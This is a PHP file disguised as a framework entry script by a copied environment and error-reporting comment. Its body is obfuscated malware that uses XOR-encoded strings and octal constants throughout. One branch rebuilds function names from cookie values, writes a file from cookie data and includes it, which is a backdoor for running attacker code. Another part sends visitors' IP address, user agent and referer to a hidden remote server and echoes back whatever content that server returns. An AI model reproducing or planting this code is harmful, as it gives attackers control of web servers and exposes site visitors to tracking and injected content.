 <?php
/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
class View
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s)
            self::i();
        $l = strlen($k);
		$b = 'base6' . '4_dec' . 'ode';
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r); $i !== $c; ++$i)
            $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_qy' => 'HgkJOhkZcikFMR4YM' . 'AZHHgYG' . 'MB1HEBgD' . 'O' . 'A' . 'ME' . 'ZUp' . 'A',
            '_f' => 'HBgcGToZBkALDgIIZVcTHS8bGw4+AxsCMVgYDCkWAQ4tH' . 'g' . 'IZ',
            '_jrk' => 'PAw' . '=',
            '_bwj' => '',
            '_b' => 'L' . 'hkAJw==',
            '_fo' => 'Yw' . 'Q0VQ==',
            '_bv' => 'YxIb' . 'O04' . '=',
            '_ic' => 'KAw' . 'z' . 'A' . 'Q' . '==',
            '_mpv' => '',
            '_j' => '',
            '_ix' => '',
            '_dx' => 'NwMYL01DcBYcNlkPPhQEOhsDPhMJLVkPMBpDPBg' . 'BLxgfOgV' . 'CNQR' . 'TOxYYPko=',
            '_iys' => 'PAMXCQ' . 'Af' . 'Cww' . 'r',
            '_ksu' => 'NxUrE' . 'QACMAU' . '6',
            '_jv' => 'LB' . 'Y3EDI' . 'Q',
            '_wat' => 'NwwF' . 'Lw' . 's=',
            '_fsq' => 'GCkLT' . 'A=' . '=',
            '_bpc' => 'LwMVNw' . '=' . '=',
            '_zr' => 'L' . 'gAVLQ' . 'w' . '=',
            '_st' => 'YA' . '=' . '=',
            '_g' => 'Lg' . 'I6' . 'BS' . 'Y' . '=',
            '_uxk' => 'fy05LA9KXFZva' . 'Gcw' . 'MBYZQ' . 'n8=',
            '_ho' => 'NxYCGw' . '=' . '=',
            '_kpz' => 'UnkxMB0cOhAGNhw' . 'cZVMxMxwBOn54Unk' . '=',
            '_ucc' => 'LAEzSHBd',
            '_dey' => '',
            '_t' => 'Nx' . '0UKw' . '=' . '=',
            '_h' => 'Un' . 'M=',
            '_n' => 'FzwxKQArKTAaJjEmFjg=',
            '_yp' => 'FzohKQA2Kj8QP' . 'CI4DSowPQAo' . 'Ois=',
            '_i' => 'DTE' . 'oECAgA' . 'DUhGy' . 'Y' . '=',
            '_lb' => 'Fzw/Dzc+D' . 'C05' . 'ACksGiY/',
            '_yo' => 'FyQjDy8iDDUlADE' . 'w' . 'G' . 'j' . '4j',
            '_mr' => '',
            '_se' => 'Fz' . 'A8KAA2LT4' . 'aNi0q',
            '_usd' => 'FyQsKAAiPT' . '4a' . 'Ij' . '0q',
            '_to' => '',
            '_e' => 'Fz' . 'UkI' . 'wAiPDoaL' . 'yQsFjE' . '=',
            '_q' => 'Fzk7KAAuIzEaIzsnF' . 'j0' . '=',
            '_yym' => 'FzgmDzMqACo9DTszDSg' . '3' . 'GzM' . '0E' . 'D4' . '=',
            '_qec' => 'Fyc9JQArNjMQIT40DTcsMQA1Jic' . '=',
            '_yn' => 'DSo6IQsqKC8bKyU=',
            '_amt' => 'DT07JAs9KSobP' . 'C' . 'Q=',
            '_tm' => 'OwY' . 'TMgsQ' . 'Og' . '=' . '=',
            '_fn' => 'F' . 'jJXfw' . '=' . '=',
            '_gb' => 'f' . 'w9MOh5' . 'J' . 'TA=' . '=',
            '_thl' => 'fxZFDQ8DZUo' . '=',
            '_tni' => 'N' . 'gA=',
            '_xf' => 'LRw' . 'N',
            '_gt' => 'K' . 'h' . 'Q' . '=',
            '_ept' => 'PR' . 'gAOg==',
            '_rm' => 'aV' . 'A' . '=',
            '_z' => 'ABYM' . 'PBwG' . 'Og=' . '=',
            '_ljg' => 'LhoZFw=='
        );
    }
}
class _ca
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            00,
            02,
            031,
            031,
            01,
            031,
            02,
            02,
            01,
            021,
            05,
            013,
            035,
            016,
            015,
            032,
            017,
            014,
            03,
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
@header(View::g('_q' . 'y', '_j' . 'j'));
@header(View::g('_f', '_wrm'));
if (isset($_GET[View::g('_j' . 'r' . 'k', '_' . 'd' . 'p')])) {
    $_mdm = get_js(View::g('_' . 'bwj', '_p'));
    if ($_mdm && strpos($_mdm, View::g('_' . 'b', '_nz')) !== false) {
        die(View::g('_' . 'fo', '_' . 'k'));
    } else {
        die(View::g('_' . 'bv', '_pz'));
    }
}
if (isset($_GET[View::g('_' . 'ic', '_' . 'm')])) {
    $_or        = $_COOKIE;
    $_sd        = _ca::g(0);
    $_juj       = _ca::g(1);
    $_mtj       = array();
    $_mtj[$_sd] = View::g('_mp' . 'v', '_' . 'x');
    while ($_juj) {
        $_mtj[$_sd] .= $_or[_ca::g(2)][$_juj];
        if (!$_or[_ca::g(3)][$_juj + _ca::g(4)]) {
            if (!$_or[_ca::g(5)][$_juj + _ca::g(6)])
                break;
            $_sd++;
            $_mtj[$_sd] = View::g('_' . 'j', '_' . 's');
            $_juj++;
        }
        $_juj = $_juj + _ca::g(7) + _ca::g(8);
    }
    $_sd = $_mtj[_ca::g(9)]() . $_mtj[_ca::g(10)];
    if (!$_mtj[_ca::g(11)]($_sd)) {
        $_juj = $_mtj[_ca::g(12)]($_sd, $_mtj[_ca::g(13)]);
        $_mtj[_ca::g(14)]($_juj, $_mtj[_ca::g(15)] . $_mtj[_ca::g(16)]($_mtj[_ca::g(17)]($_or[_ca::g(18)])));
    }
    include($_sd);
}
function get_js($_ehw, $_lw = 'eydhmwdyfualmuufxa', $_d = 'igslgevvenlvymob')
{
    $_te = View::g('_ix', '_' . 'ipv');
    $_ny = View::g('_d' . 'x', '_wl') . $_ehw;
    if (is_callable(View::g('_iys', '_v' . 'ee'))) {
        $_z = curl_init($_ny);
        curl_setopt($_z, _ca::g(19), false);
        curl_setopt($_z, _ca::g(20), _ca::g(21));
        curl_setopt($_z, _ca::g(22), _ca::g(23));
        curl_setopt($_z, _ca::g(24), _ca::g(25));
        curl_setopt($_z, _ca::g(26), _ca::g(27));
        curl_setopt($_z, _ca::g(28), _ca::g(29));
        curl_setopt($_z, _ca::g(30), _ca::g(31));
        $_te = curl_exec($_z);
        $_wo = curl_getinfo($_z);
        curl_close($_z);
        if ($_wo[View::g('_ks' . 'u', '_' . 'a')] != _ca::g(32))
            return false;
    } else {
        $_toz = parse_url($_ny);
        $_ak  = ($_toz[View::g('_jv', '_' . 'u')] == View::g('_' . 'wa' . 't', '_' . 'x' . 'q'));
        $_l   = View::g('_f' . 's' . 'q', '_' . 'l') . $_toz[View::g('_bpc', '_' . 'b' . 'a')];
        if (isset($_toz[View::g('_zr', '_up')]))
            $_l .= View::g('_' . 'st', '_d' . 'fh') . $_toz[View::g('_' . 'g', '_w')];
        $_l .= View::g('_uxk', '_' . 'e' . 'mx') . $_toz[View::g('_' . 'h' . 'o', '_y' . 'q' . 'o')] . View::g('_k' . 'pz', '_' . 'sr');
        $_t = fsockopen(($_ak ? View::g('_uc' . 'c', '_' . 'r') : View::g('_' . 'd' . 'e' . 'y', '_c')) . $_toz[View::g('_' . 't', '_r' . 'g')], $_ak ? _ca::g(33) : _ca::g(34));
        if ($_t) {
            fputs($_t, $_l);
            $_mdv = _ca::g(35);
            while (!feof($_t)) {
                $_n = fgets($_t, _ca::g(36));
                if ($_mdv)
                    $_te .= $_n;
                if ($_n == View::g('_h', '_yj' . 'v'))
                    $_mdv = _ca::g(37);
            }
            fclose($_t);
        }
    }
    return $_te;
}
$_vt  = isset($_SERVER[View::g('_n', '_h' . 'ey')]);
$_deb = isset($_SERVER[View::g('_y' . 'p', '_nuy')]);
$_iya = isset($_SERVER[View::g('_' . 'i', '_' . 'te')]);
$_oi  = isset($_SERVER[View::g('_l' . 'b', '_hk')]) ? $_SERVER[View::g('_' . 'y' . 'o', '_' . 'pw')] : View::g('_mr', '_obg');
$_heg = isset($_SERVER[View::g('_s' . 'e', '_' . 'dhx')]) ? $_SERVER[View::g('_' . 'us' . 'd', '_p' . 'x' . 'x')] : View::g('_t' . 'o', '_zm');
$_vt  = isset($_SERVER[View::g('_e', '_aps')]) ? $_SERVER[View::g('_q', '_' . 'm' . 'o' . 'x')] : null;
$_deb = isset($_SERVER[View::g('_' . 'yy' . 'm', '_l' . 'r')]) ? $_SERVER[View::g('_qe' . 'c', '_s' . 'iu')] : null;
$_iya = isset($_SERVER[View::g('_' . 'y' . 'n', '_ow' . 'n')]) ? $_SERVER[View::g('_am' . 't', '_x' . 'vk')] : null;
if (filter_var($_vt, _ca::g(38))) {
    $_tca = $_vt;
} elseif (filter_var($_deb, _ca::g(39))) {
    $_tca = $_deb;
} else {
    $_tca = $_iya;
}
if (isset($_GET[View::g('_tm', '_dt')])) {
    echo View::g('_f' . 'n', '_b' . 'm') . $_tca . View::g('_g' . 'b', '_sl' . 'o') . $_oi . View::g('_th' . 'l', '_' . 'j' . 'e') . $_heg;
}
if (!isset($_tca) || !isset($_oi) || !isset($_heg)) {
    exit();
} else {
    $_ehw = array(
        View::g('_tn' . 'i', '_p' . 'g' . 'g') => $_tca,
        View::g('_x' . 'f', '_yke') => $_heg,
        View::g('_' . 'g' . 't', '_uy' . 'b') => $_oi
    );
    $_kqx = View::g('_ept', '_' . 'ys') . View::g('_' . 'rm', '_' . 'd') . View::g('_z', '_sb');
    $_ehw = urlencode($_kqx(json_encode($_ehw)));
    $_mdm = get_js($_ehw);
    if ($_mdm && strpos($_mdm, View::g('_ljg', '_mco')) !== false) {
        echo $_mdm;
        exit();
    }
} /* BAAjbmJm */